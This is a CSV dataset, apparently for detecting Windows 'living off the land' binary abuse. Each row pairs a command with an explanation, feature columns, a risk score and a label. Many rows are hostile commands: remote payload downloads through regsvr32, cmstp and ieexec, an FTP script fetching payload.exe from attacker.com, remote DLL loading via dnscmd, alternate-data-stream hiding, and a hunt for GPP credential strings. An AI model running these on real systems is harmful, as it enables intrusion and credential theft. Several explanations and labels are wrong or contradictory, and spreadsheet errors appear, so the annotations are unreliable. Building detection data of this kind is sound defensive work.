prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat,"This command downloads a malicious script from a GitHub repository and executes it using regsvr32.exe, which is a legitimate Windows binary, to bypass application whitelisting.","cmd.exe, regsvr32.exe",fakefile.doc:payload.bat,none,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ,none,"/c,echo,/s,/u,/I,scrobj.dll",none,0.65,malicious
cmdkey /list,"This command can be used to list all stored credentials on a Windows machine, which can be useful for an attacker to gain access to sensitive information or systems.",cmdkey,none,none,none,none,/list,none,0.15,benign
cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf,"This command can be used to install a VPN profile on a Windows machine, potentially allowing an attacker to establish a persistent connection to a remote network.",cmstp.exe,c:\cmstp\CorpVPN.inf,none,c:\cmstp\CorpVPN.inf,none,"/ni,/s",none,0.65,malicious
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,"This command can be used to execute a malicious payload in the form of a Cmstp.inf file hosted on a remote server, allowing an attacker to bypass security measures and gain persistence on the compromised machine.",cmstp.exe,https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,none,https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,none,"/ni,/s",none,0.65,malicious
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,This command can be used to bypass security policies and execute the Windows calculator program while also potentially downloading and executing a malicious file from a remote server.,ConfigSecurityPolicy.exe,https://10.10.10.10/xxxxxxxxx?encodedfile ,none,C:\\\\Windows\\\\System32\\\\calc.exe ,10.10.10.10,none,none,0.65,malicious
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile,This command is not a valid Windows command.,ConfigSecurityPolicy.exe,https://11.11.11.11/xxxxxxxxx?encodedfile ,none,C:\\\\Windows\\\\System32\\\\calc.exe ,11.11.11.11,none,none,0.65,malicious
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,"This command can be used to bypass security policies and execute the calculator program, while also sending information to a remote server.",ConfigSecurityPolicy.exe, https://webhook.site/xxxxxxxxx?encodedfile,none,C:\\\\Windows\\\\System32\\\\calc.exe ,none,none,none,0.55,suspicious
control.exe c:\\windows\\tasks\\file.txt:evil.dll,"This command can be used to execute a malicious DLL file from a scheduled task, allowing an attacker to maintain persistence on the compromised system.",control.rxr, c:\\windows\\tasks\\file.txt:evil.dll,none, c:\\windows\\tasks\\file.txt:evil.dll,none,none,none,0.55,suspicious
csc.exe -out:My.exe File.cs,"Compile C# code and create an executable file, which can be used to execute malicious code on a Windows machine.",csc.exe,"File.cs, My.exe",none,none,none,#NAME?,none,0.55,suspicious
cscript c:\\ads\\file.txt:script.vbs,"This command can be used to execute a VBScript file stored in an Alternate Data Stream (ADS) of a text file, potentially allowing an attacker to hide their malicious code and evade detection.",cscript,c:\\ads\\file.txt:script.vbs,none,c:\\ads\\file.txt:script.vbs,none,none,none,0.55,suspicious
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,"This command generates a proxy class for a specified web service and saves it as a file in the System32 directory, while also sending an encoded file to a specified webhook URL, potentially allowing an attacker to execute arbitrary code on the machine by replacing the URI with a malicious one.",DataSvcUtil,https://webhook.site/xxxxxxxxx?encodedfile,none,:C:\\\\Windows\\\\System32\\\\calc.exe,none,/out,none,0.65,malicious
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile,"This command could potentially be used in a cyberattack for 'living off the land' to download and execute a malicious file (in this case, the Windows calculator) from a remote server specified by the URI.",DataSvcUtil,https://11.11.11.11/xxxxxxxxx?encodedfile,none,:C:\\\\Windows\\\\System32\\\\calc.exe,11.11.11.11,/out,none,0.75,malicious
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://10.10.10.10/xxxxxxxxx?encodedfile,"This command could potentially be used to download a file from a remote server and save it as the Windows calculator executable in the System32 directory, allowing an attacker to execute arbitrary code on the compromised machine.",DataSvcUtil,https://10.10.10.10/xxxxxxxxx?encodedfile,none,:C:\\\\Windows\\\\System32\\\\calc.exe,10.10.10.10,/out,none,0.75,malicious
"set ""SYSTEMROOT=C:\\Windows\\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr","This command sets the SYSTEMROOT environment variable to C:\\Windows\\Temp and then executes the desktopimgdownldr.exe program with parameters to download a file from a specified URL and set it as the lock screen image, potentially allowing an attacker to persistently display malicious content on the victim's machine.",desktopimgdownldr.exe,https://domain.com:8080/file.ext,desktopimgdownldr, https://domain.com:8080/file.ext,domain.com:8080,"set,/c,/eventName",none,0.95,malicious
rundll32.exe dfshim.dll,This command can be used to execute .NET applications and could potentially be used to run malicious code or execute a payload on a Windows machine.,rundll32.exe,dfshin.dll,none,none,none,none,none,0.45,suspicious
diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab,This command is not a standard Windows command and does not exist in a default Windows installation.,diantz.exe, c:\\destinationFolder\\targetFile.txt:targetFile.cab,none, c:\\pathToFile\\file.exe,none,targetFile.cab,none,0.65,malicious
diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,"This command can be used to compress a file on a remote machine and transfer it to a local machine, potentially for exfiltration of sensitive data.",diantz.exe,c:\\destinationFolder\\file.cab,none,\\\\remotemachine\\pathToFile\\file.exe,none,none,none,0.55,suspicious
diantz.exe \\\\11.121.12.13\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,This command can be used to copy a file from a remote machine to a local machine and package it into a CAB file. It can be used in a cyberattack to move malicious files from a compromised machine to a target machine.,diantz.exe,c:\\destinationFolder\\file.cab,none,\\\\11.121.12.13\\pathToFile\\file.exe,11.121.12.13,none,none,0.65,malicious
diantz.exe \\\\10.10.10.10\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,This command can be used to copy a file from a remote machine to a local machine and package it into a CAB file. It can be used in a cyberattack to move malicious files from a compromised machine to a target machine.,diantz.exe,c:\\destinationFolder\\file.cab,none,\\\\10.10.10.10\\pathToFile\\file.exe,10.10.10.10,none,none,0.65,malicious
diskshadow.exe /s c:\\test\\diskshadow.txt,"This command can be used to create a shadow copy of a volume, which can be useful for backing up or accessing files that are currently in use, and could potentially be used by an attacker to access sensitive data on a Windows machine.",diskshadow.exe,c:\\test\\diskshadow.txt,none,none,none,/s,none,0.55,suspicious
diskshadow> exec calc.exe,"Potential use: Launching a malicious executable (in this case, the Windows calculator) using a legitimate Windows utility (diskshadow) for ""living off the land"" purposes.

What it does: Executes the Windows calculator program.",diskshadow,calc.exe,none,none,none,exec,none,0.55,suspicious
dllhost.exe /Processid:{CLSID},"This command can be used to execute arbitrary code within a COM surrogate process, potentially allowing an attacker to bypass application whitelisting or execute code with elevated privileges.",dllhost.exe,CLSID,none,none,none,/Processid,none,0.55,suspicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll,"This command can be used to load a malicious DLL on a remote DNS server, potentially allowing an attacker to execute arbitrary code on the target machine.",dnscmd.exe,\\\\192.168.0.149\\dll\\wtf.dll,none,dc1.lab.int,192.168.0.149," /config,/serverlevelplugindll ",none,0.75,malicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll,"This command can be used to load a malicious DLL file on a remote DNS server, potentially allowing an attacker to execute arbitrary code on the server.",dnscmd.exe,\\\\193.168.0.149\\dll\\wtf.dll,none,dc1.lab.int,193.168.0.149," /config,/serverlevelplugindll ",none,0.75,malicious
dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll,"This command can be used to load a malicious DLL file on a remote DNS server, potentially allowing an attacker to execute arbitrary code on the target machine.",dnscmd.exe,\\\\193.168.0.149\\dll\\wtf.dll,none,10.10.10.10,193.168.0.150," /config,/serverlevelplugindll ",none,0.75,malicious
esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o,"This command can be used to copy a file from one location to another and overwrite the destination file without prompting, which can be useful for hiding malicious scripts or replacing legitimate files with malicious ones.",esentutl.exe,C:\\folder\\destfile.vbs,none,C:\\folder\\sourcefile.vbs,none,"/y,/d,/o",none,0.65,malicious
esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o,"This command can be used to hide a malicious executable within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to bypass detection and execute the malicious code using the legitimate file as a cover.",esentutl.exe,c:\\ADS\\file.txt:file.exe,none,C:\\ADS\\file.exe,none,"/y,/d,/o",none,0.65,malicious
esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to download and execute a malicious executable from a remote server, potentially allowing an attacker to gain unauthorized access to a Windows machine.",esentutl.exe, \\\\otherwebdavserver\\webdav\\adrestore.exe,none,\\\\live.sysinternals.com\\tools\\adrestore.exe,none,"/y,/d,/o",none,0.65,malicious
esentutl.exe /y \\\\11.11.11.11\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to copy a malicious executable from a remote server to a Windows machine and overwrite a legitimate executable, potentially allowing an attacker to execute arbitrary code with elevated privileges.",esentutl.exe, \\\\otherwebdavserver\\webdav\\adrestore.exe,none,\\\\11.11.11.11\\tools\\adrestore.exe,11.11.11.11,"/y,/d,/o",none,0.75,malicious
esentutl.exe /y \\\\10.10.10.10\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to copy a malicious executable from a remote server to a Windows machine and overwrite a legitimate executable, allowing an attacker to execute their own code in place of the legitimate one.",esentutl.exe, \\\\otherwebdavserver\\webdav\\adrestore.exe,none,\\\\10.10.10.10\\tools\\adrestore.exe,10.10.10.10,"/y,/d,/o",none,0.75,malicious
eventvwr.exe,"Potential use in a cyberattack: Viewing and manipulating event logs to cover tracks or gather information.
What it might do on a Windows machine: Launch the Event Viewer, a tool for viewing and managing system and application logs.",eventvwr.exe,none,none,none,none,none,none,0.05,benign
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat,"This command can be used to execute a hidden batch file stored in an Alternate Data Stream (ADS) on a remote WebDAV server, allowing an attacker to run malicious code on a victim's machine without detection.",expand ,c:\\ADS\\file.bat,none,\\\\webdav\\folder\\file.bat,none,none,none,0.55,suspicious
expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat,"This command concatenates the contents of two batch files and saves the result in a new file, which could potentially be used to execute malicious code or commands.",expand , c:\\ADS\\file2.bat,none,c:\\ADS\\file1.bat,none,none,none,0.55,suspicious
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an alternate data stream of a legitimate file, allowing an attacker to execute the malicious code while appearing to be a legitimate file.",expand ,c:\\ADS\\file.txt:file.bat,none,\\\\webdav\\folder\\file.bat,none,none,none,0.55,suspicious
expand \\\\11.12.13.14\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to execute the malicious code while appearing as a legitimate file on the system.",expand ,c:\\ADS\\file.txt:file.bat,none,\\\\11.12.13.14\\folder\\file.bat,11.12.13.14,none,none,0.65,malicious
expand \\\\10.10.10.10\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to execute the malicious code while appearing to be a legitimate file.",expand ,c:\\ADS\\file.txt:file.bat,none,\\\\10.10.10.10\\folder\\file.ba,10.10.10.10,none,none,0.65,malicious
explorer.exe /root,"Potential use: Launches Windows Explorer with a specific folder as the root directory.
Cyberattack use: Can be used to navigate to sensitive directories and steal data or execute malicious files.",explorer.exe,none,none,none,none,/root,none,0.15,benign
Extexport.exe c:\\test foo bar,"Potential use in a cyberattack: Exporting data from a specified file or directory.
What it might do on a Windows machine: Export the contents of the ""test"" directory to a file named ""foo"" with a password of ""bar"".",Extexport.exe,c:\\test foo bar,none,c:\\test foo bar,none,none,none,0.55,suspicious
extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe,"This command can be used to extract a file from a cabinet (.cab) archive and save it to a specified location on the machine, potentially allowing an attacker to extract and execute a malicious file.",extrac32,c:\\ADS\\file.txt:procexp.exe,none,C:\\ADS\\procexp.cab,none,none,none,0.55,suspicious
extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt,"This command can be used to extract a file from a remote WebDAV server and copy it to a local folder on a Windows machine, potentially allowing an attacker to steal sensitive data from the remote server.",extrac32 ,C:\\folder\\test.txt,none,\\\\webdavserver\\share\\test.txt,none,"/Y,/C",none,0.65,malicious
extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe,"This command extracts the calc.exe file from the System32 folder and copies it to the Desktop folder, potentially allowing an attacker to execute arbitrary code on the system.",extrac32.exe,C:\\Users\\user\\Desktop\\calc.exe,none,C:\\Windows\\System32\\calc.exe,none,/C,none,0.65,malicious
findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe,"This command searches for all lines in the file.exe that do not contain the string ""W3AllLov3DonaldTrump"" and saves the output to a text file named ""file.txt:file.exe"" in the ""c:\ADS"" directory. 

Potential use in a cyberattack for 'living off the land': This command can be used to search for sensitive information in a file and extract it to a text file for exfiltration.",findstr,W3AllLov3DonaldTrump,none, c:\\ADS\\file.exe,none," /V,/L",none,0.65,malicious
findstr /S /I cpassword \\\\sysvol\\policies\\*.xml,This command can be used to search for plaintext passwords in Group Policy Objects (GPOs) on a Windows domain controller.,findstr ,cpassword,none,\\\\sysvol\\policies\\*.xml,none,"/S,/I",none,0.65,malicious
findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe,"This command can be used to hide malicious code within an alternate data stream (ADS) of a legitimate file, making it difficult to detect and potentially allowing for persistence on the system.",findstr,W3AllLov3DonaldTrump,none, \\\\webdavserver\\folder\\file.exe,none," /V,/L",none,0.65,malicious
forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe,"This command can be used to search for all instances of notepad.exe in the system32 folder and execute calc.exe in its place, potentially allowing for the execution of malicious code.",forfiles,calc.exe,none,c:\\windows\\system32,none,"/p,/m,/c",none,0.65,malicious
"forfiles /p c:\\windows\\system32 /m notepad.exe /c ""c:\\folder\\normal.dll:evil.exe""","This command can be used to hide a malicious executable (evil.exe) within a legitimate DLL file (normal.dll) by appending it to the end of the DLL file, and potentially evade detection by security software.",forfiles,c:\\folder\\normal.dll:evil.exe,none,c:\\windows\\system32,none,"/p,/m,/c",none,0.65,malicious
echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,"This command can be used to download and execute the Windows calculator program (calc.exe) from an FTP server, potentially allowing an attacker to execute arbitrary code on the target machine.",calc.exe,calc.exe,ftpcommands.txt,ftpcommands.txt,none,#NAME?,none,0.75,malicious
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",This command can be used to download a payload from an attacker-controlled FTP server onto the victim's machine using the Windows command line.,cmd.exe,"attacker.com, USER attacker, PASS PaSsWoRd, binary, /payload.exe, quit",echo,ftp.txt,none,"/c,echo,GET,-s,-v",none,0.85,malicious
"cmd.exe /c ""@echo open 11.11.11.11 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""","This command can be used to download a payload from an FTP server and execute it on the victim's machine, potentially allowing the attacker to gain remote access or control.",cmd.exe,"11.11.11.11, USER attacker, PASS PaSsWoRd, binary, /payload.exe, quit",echo,ftp.txt,11.11.11.11,"/c,echo,GET,-s,-v",none,0.95,malicious
"cmd.exe /c ""@echo open 10.10.10.10 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",This command can be used to download a payload from an FTP server and execute it on the victim's machine.,cmd.exe,"10.10.10.10, USER attacker, PASS PaSsWoRd, binary, /payload.exe, quit",echo,ftp.txt,10.10.10.10,"/c,echo,GET,-s,-v",none,0.95,malicious
"C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""","This command can be used to download a file from a specified URL and save it to a specified destination on a Windows machine, potentially allowing an attacker to download and execute malicious code.",GfxDownloadWrapper.exe,"""URL"",""DESTINATION FILE""",none,C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe,none,none,none,0.55,suspicious
Gpscript /logon,"Potential use: Execute a script during user logon.
What it does: Runs a specified script during user logon.",Gpscript,none,none,none,none,/logon,none,0.15,benign
HH.exe http://some.url/script.ps1,"This command can be used to execute a PowerShell script hosted on a remote server, allowing an attacker to download and run malicious code on a victim's machine.",HH.exe,http://some.url/script.ps1,none, http://some.url/script.ps1,none,none,none,0.55,suspicious
HH.exe c:\\windows\\system32\\calc.exe,"This command can be used to execute the Windows Calculator (calc.exe) from the command line, potentially as a way to test if a command execution vulnerability exists on the system.",HH.exe,c:\\windows\\system32\\calc.exe,none,c:\\windows\\system32\\calc.exe,none,none,none,0.55,suspicious
ie4uinit.exe -BaseSettings,"Potential use: Launch Internet Explorer with default settings to bypass security restrictions.
What it does: Initializes Internet Explorer with default settings.",ie4uinit.exe,none,none,none,none,#NAME?,none,0.15,benign
ieexec.exe http://x.x.x.x:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, potentially bypassing security measures on the target machine.",ieexec.exe, http://x.x.x.x:8080/bypass.exe,none, http://x.x.x.x:8080/bypass.exe,x.x.x.x:8080,none,none,0.65,malicious
ieexec.exe http://10.10.10.10:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, potentially allowing an attacker to gain unauthorized access or control of the compromised system.",ieexec.exe,http://10.10.10.10:8080/bypass.exe,none,http://10.10.10.10:8080/bypass.exe,10.10.10.10:8080,none,none,0.55,suspicious
ieexec.exe http://11.11.11.11:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, allowing an attacker to gain control of the compromised machine.",ieexec.exe, http://11.11.11.11:8080/bypass.exe,none, http://11.11.11.11:8080/bypass.exe,11.11.11.11:8080,none,none,0.55,suspicious
ilasm.exe C:\\public\\test.txt /exe,"This command is not related to cyberattacks or living off the land techniques. 

However, to provide some information, ilasm.exe is a Microsoft Intermediate Language Assembler used to compile .NET assemblies from IL code, and the command is attempting to compile a text file as an executable.",ilasm.exe,C:\\public\\test.txt,none,C:\\public\\test.txt,none,/exe,none,0.65,malicious
InfDefaultInstall.exe Infdefaultinstall.inf,"Potential use: Install a malicious driver or application.
What it does: Installs a driver or application using the information in the specified .inf file.",InfDefaultInstall.exe,Infdefaultinstall.inf,none,none,none,none,none,0.45,suspicious
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,"This command can be used to install a malicious .dll file as a Windows service, allowing for persistence and remote access to the compromised machine.",InstallUtil.exe, AllTheThings.dll,none,none,none,"/logfile,/LogToConsole",none,0.55,suspicious
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,"This command can be used to install a malicious .dll file as a Windows service, allowing for persistence and remote access to the compromised machine.",InstallUtil.exe, AllTheThings.dll,none,none,none,"/logfile,/LogToConsole",none,0.55,suspicious
jsc.exe scriptfile.js,"Execute a JScript or JavaScript file, which could potentially be used to run malicious code or scripts on a Windows machine.",jsc.exe,scriptfile.js,none,none,none,none,none,0.45,suspicious
makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab,"This command can be used to compress a file into a cabinet (.cab) file format, which can be used to hide malicious files or data within legitimate files on a Windows machine.",makecab,c:\\ADS\\cabtest.txt:autoruns.cab,none,c:\\ADS\\autoruns.exe,none,none,none,0.55,suspicious
makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab,"This command can be used to compress a file into a cabinet (.cab) file format, which can be used to transfer files over the network, and potentially hide malicious files or payloads.",makecab,C:\\Folder\\file.cab,none,\\\\webdavserver\\webdav\\file.exe,none,none,none,0.55,suspicious
makecab \\\\10.10.10.10\\webdav\\file.exe C:\\Folder\\file.cab,"This command can be used to compress a file into a cabinet (.cab) file format and transfer it over the network to a remote location, potentially for exfiltration of data or malware delivery.",makecab,C:\\Folder\\file.cab,none,\\\\10.10.10.10\\webdav\\file.exe,10.10.10.10,none,none,0.65,malicious
